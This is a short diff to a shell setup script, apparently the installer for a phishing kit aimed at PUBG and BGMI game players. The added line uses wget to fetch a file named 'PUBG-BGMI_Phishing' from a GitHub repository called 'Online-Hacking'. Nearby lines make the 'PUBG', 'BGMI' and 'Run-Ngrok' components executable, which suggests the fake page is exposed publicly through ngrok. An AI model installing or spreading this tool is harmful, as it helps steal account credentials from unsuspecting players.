@@ -148,7 +148,7 @@ chmod +x PUBG
 chmod +x BGMI
 chmod +x Run-Ngrok
 rm -rf PUBG-BGMI_Phishing 
-wget
+wget https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/PUBG-BGMI_Phishing
 clear
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
